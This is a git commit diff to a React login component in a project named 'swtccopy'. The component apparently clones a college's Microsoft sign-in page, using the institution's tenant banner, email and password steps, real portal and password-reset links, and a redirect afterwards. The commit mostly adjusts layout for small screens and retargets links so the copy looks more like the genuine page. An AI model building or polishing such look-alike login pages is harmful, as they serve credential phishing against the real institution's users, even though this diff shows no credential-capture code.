aa5585816c9023d82a92e9c1962b825dd1a2fd38
TheMythicalOX <keokline2015@gmail.com>
2025-04-02 16:39:34 -0500

    more updates

--- FrontEnd/swtccopy/src/Components/Login.tsx
+++ FrontEnd/swtccopy/src/Components/Login.tsx
@@ -3,8 +3,10 @@ import iconSource from "../images/microsofticon.ico";
 import { AnimatePresence, motion } from "motion/react";
 import backArrow from "../images/logbackarrow.svg";
 import Submit from "./Submit";
+import { useWindowDimensions } from "./App";
 
 const Login = (props: { next: string }) => {
+  const { width } = useWindowDimensions();
   const title = "Sign in to your account";
   const icon = iconSource;
   const [useIsPassword, setIsPassword] = useState(false);
@@ -20,6 +22,28 @@ const Login = (props: { next: string }) => {
     window.location.href = props.next;
   };
 
+  let tmp = "";
+  let tmp2 = "";
+  let tmp3 = "";
+  let tmp4 = "";
+  let tmp5 = "";
+
+  if (width < 600) {
+    tmp = "w-screen h-screen fixed bg-white opacity-[100%] z-25 ";
+    tmp2 = "z-0 w-screen w-[90%] absolute";
+    tmp3 =
+      "w-[440px] h-[416px] m-auto shadow-stone-900  z-50 text-[.9375rem] transition-all";
+    tmp4 = "text-[#747474] h-fit inline-flex text-[12px] items-center";
+    tmp5 = "block fixed bottom-[4px] z-50 h-6";
+  } else {
+    tmp = "w-screen h-screen fixed bg-black opacity-[55%] z-25 ";
+    tmp2 = "z-0 w-screen h-[98vh] flex items-center absolute";
+    tmp3 =
+      "w-[440px] h-[416px] m-auto shadow-stone-900 shadow-md z-50 text-[.9375rem] transition-all";
+    tmp4 = "text-white h-fit inline-flex text-[12px] items-center";
+    tmp5 = "block fixed bottom-[4px] right-0 z-50 h-6";
+  }
+
   useEffect(() => {
     setBackAndForth("100%");
     document.title = title;
@@ -34,12 +58,12 @@ const Login = (props: { next: string }) => {
   return (
     <div className="loginBody">
       <div className="loginBackgroundGradient z-0 fixed w-screen h-screen"></div>
-      <div className="w-screen h-screen fixed bg-black opacity-[55%] z-25 "></div>
+      <div className={tmp}></div>
 
-      <div className=" z-0 w-screen h-[98vh] flex items-center absolute">
+      <div className={tmp2}>
         {!useIsPassword && (
-          <div className="w-[440px] h-[416px] m-auto shadow-stone-900 shadow-md z-50 text-[.9375rem] transition-all">
-            <div className="w-full h-full bg-white overflow-hidden">
+          <div className={tmp3}>
+            <div className="w-full h-full bg-white overflow-hidden relative">
               <div className="pt-[44px] px-[44px]">
                 <img
                   src="https://aadcdn.msftauthimages.net/dbd5a2dd-uu6n-8cm1lzzxmp32bd-arusmto4dao1chilpm9uy5s/logintenantbranding/0/bannerlogo?ts=637278424175273182"
@@ -47,7 +71,7 @@ const Login = (props: { next: string }) => {
                   className="h-[36px]"
                 />
               </div>
-              <div className="bg-[#f2f2f2] z-49 h-[83.19px] w-[440px] absolute top-[65.84%] left-1/2 transform -translate-x-1/2 -translate-y-1/2"></div>
+              <div className="w-full bg-[#f2f2f2] h-[20%] absolute bottom-0"></div>
               <AnimatePresence>
                 {isVisible ? (
                   <motion.div
@@ -64,7 +88,7 @@ const Login = (props: { next: string }) => {
                         </h1>
                         <input
                           type="text"
-                          placeholder="Email, phone, or Skype"
+                          placeholder="Please enter email address here"
                           value={useEmail}
                           onChange={(e) => {
                             setEmail(e.target.value);
@@ -74,12 +98,11 @@ const Login = (props: { next: string }) => {
                         <div>
                           <div className="flex text-[.8125rem]">
                             <p className="text-black">
-                              {"No Account?"}{" "}
                               <a
                                 className="text-[#0067b8]  inline-block pt-[16px] pl-[2px] block hover:text-stone-700 hover:underline"
-                                href="https://passwordreset.microsoftonline.com/?ru=https%3a%2f%2flogin.microsoftonline.com%2fcommon%2freprocess%3fctx%3drQQIARAArZK_i9NgGMeb63n-wNPD_0ARB_GuyZumbQ4ObC9NetG8ucSkbbJI3jdp0zS_Lk1zbf6Cw0VxUHBUcHA6nMRFQVBwchQnxUFxECdxcDAdHHRycHgeHnge-H6-PN-LZWqD2jw_YOuIrjVq6wjXyfXqwHHWEVOz1wdVplFvVAFpU0xy5sQa8yp69unt7cs39x70HzbvnntEbLtpGk82KxUrjjcm2I0iPxrON3AUVIphFFacWeokoeVftzCOpmE6qSQOdkaZUwlGOIkm0SB9QhBvCOIzQTxaWq3VHRJhp4bqLEDvlk7LzWnqgkWLklHu3Cv_LGMAI7NH-bs9l7Q7rVwM3AzTCotpmzTmTG4AN0Nglpn0eGoANhXDlmsLQ1bURAEJbGj1qr40Nn2no_o4YFzEs64BYGb3GBLP9bkair4BurEd6Iu71OrBOaJhZoZKgPtdH4djdsGAADvpAyY2t_Vc5fR9mVNmUJMY-Zr5m2GAAn-8q_256wNIYVrNUJcdI0C5BQ9rdVQSdyRfItuFprHQzW1a9a6G0LMENltwO9cYDwEyMIVubgv-1OirMQJV9t88QR8Fyt9-Cr0_WUUNtqHWrEKuTUn5mBFDNd_V2jTkdmiZawOYNwNbYBOzYFb8FqfkIqfrOuj6UNapIaNpmFI5k1c8gyluc8iJguLpVYmUSJlr8TBv8SrHtxXNbhV_czEYsrKmgKJIw9NnJtcNDG9ISoExM4LuGOamZ3ri2PR0BgJ963F5pYhWEIWvyyej2AlH9gUnsEb-2zLxZpn4srxEHvuxTNw_UmT18o3hh59nV1uHL5YOec8pvT5SaTjytLY34vPKTN5JjGZ7uBex-Wx-NertJ2nSQBZD7mAz9erkFrNJ3Vohvq0QB0dLT4__j5g_Xy39OHXn-9OXBx_ffe18OX1JSMEgopIrzTzi6G1dntLJTl_t97cpM45jieftodjLZiKA7a3DtdL7tdIv0&mkt=en-US&hosted=0&device_platform=Linux"
+                                href="https://login.microsoftonline.com/14f58afa-abfc-4c24-8b2b-cec4fc6f7fe6/wsfed?wa=wsignin1.0&wtrealm=https%3a%2f%2fsisportal-100925.campusnexus.cloud%2fCMCPortal%2f&wct=2025-04-02T21%3a00%3a20Z&wctx=rm%3d0%26id%3dpassive%26ru%3dsecure%2fstudent%2fstuportal.aspx&wreply=https%3a%2f%2fmyswtc.swtc.edu%2fCMCPortal%2f&AppType=Portal&Role=STUDENT#"
                               >
-                                Create one!
+                                Can’t access your account?
                               </a>
                             </p>
                           </div>
@@ -100,13 +123,13 @@ const Login = (props: { next: string }) => {
                         </div>
                       </div>
                     </div>
-                    <div className="w-full h-[25%] bg-[#f2f2f2]">
+                    <div className="w-full h-[25%] relative">
                       <div className="pt-[23px] pl-[44px]">
                         <a
                           className="text-[#0067b8] fixed z-50 hover:text-stone-700 hover:underline"
                           href="https://login.microsoftonline.com/common/oauth2/authorize?response_type=code&client_id=f97b3686-bc70-4fee-b56d-f45878420d15&redirect_uri=https%3A%2F%2Fapp.schoology.com%2Flogin%2Fexternal_accounts%2Freceive%2Fmicrosoft&state=c2NoZW1lPWh0dHBzJmhvc3Q9c3d0Yy5zY2hvb2xvZ3kuY29tJnBhdGg9JTJGbG9naW4lMkZleHRlcm5hbF9hY2NvdW50cyUyRnJlY2VpdmUlMkZtaWNyb3NvZnQmcXVlcnk9c2Nob29sX25pZCUzRDUwODQxNTM5OSZzY2hvb2xfbmlkPTUwODQxNTM5OSZzX2N1c3RvbV9kb21haW49aHR0cHMlM0ElMkYlMkZzd3RjLnNjaG9vbG9neS5jb20mZGVzdGluYXRpb249bG9naW4lMkZleHRlcm5hbF9hY2NvdW50cyUyRnNlbmQlMkZtaWNyb3NvZnQlM0ZzY2hvb2xfbmlkJTNENTA4NDE1Mzk5JnRzPTE3NDI5OTY1NTQmdG9rZW49TlVFSzdaSkVKTkFOVDdKS0E3M0M5Njg5RTgzRjgzRkQwODFFQjA5MTIxOTYzMTZFJmhhc2g9NzllZmFiNDcyNzdjOWVjYzQ5ODE2MjYzNjRiN2I5YTM%3D&scope=openid%26email&nonce=67e4044ad9bbf#"
                         >
-                          Can't access your account?
+                          Password Reset Knowledgebase
                         </a>
                       </div>
                     </div>
@@ -117,9 +140,8 @@ const Login = (props: { next: string }) => {
           </div>
         )}
         {useIsPassword && (
-          <div className="w-[440px] h-[416px] m-auto shadow-stone-900 shadow-md z-50 text-[.9375rem] transition-all">
-            <div className="w-full h-full bg-white overflow-hidden">
-              <div className="bg-[#f2f2f2] z-49 h-[83.19px] w-[440px] absolute top-[65.84%] left-1/2 transform -translate-x-1/2 -translate-y-1/2"></div>
+          <div className={tmp3}>
+            <div className="w-full h-full bg-white overflow-hidden relative">
               <div className="pt-[44px] px-[44px]">
                 <img
                   src="https://aadcdn.msftauthimages.net/dbd5a2dd-uu6n-8cm1lzzxmp32bd-arusmto4dao1chilpm9uy5s/logintenantbranding/0/bannerlogo?ts=637278424175273182"
@@ -127,6 +149,7 @@ const Login = (props: { next: string }) => {
                   className="h-[36px]"
                 />
               </div>
+              <div className="w-full bg-[#f2f2f2] h-[20%] absolute bottom-0"></div>
               <AnimatePresence>
                 {!isVisible ? (
                   <motion.div
@@ -189,7 +212,7 @@ const Login = (props: { next: string }) => {
                         </div>
                       </div>
                     </div>
-                    <div className="w-full h-[25%] bg-[#f2f2f2]">
+                    <div className="w-full h-[25%]">
                       <div className="pt-[23px] pl-[44px] fixed z-50">
                         <a
                           className="text-[#0067b8] hover:text-stone-700  hover:underline"
@@ -206,8 +229,8 @@ const Login = (props: { next: string }) => {
           </div>
         )}
       </div>
-      <div className="block fixed bottom-[4px] right-0 z-50 h-[2vh]">
-        <div className="text-white h-fit inline-flex text-[12px] items-center">
+      <div className={tmp5}>
+        <div className={tmp4}>
           <a
             className="mx-[11px] hover:underline"
             href="https://www.microsoft.com/en-US/servicesagreement/"
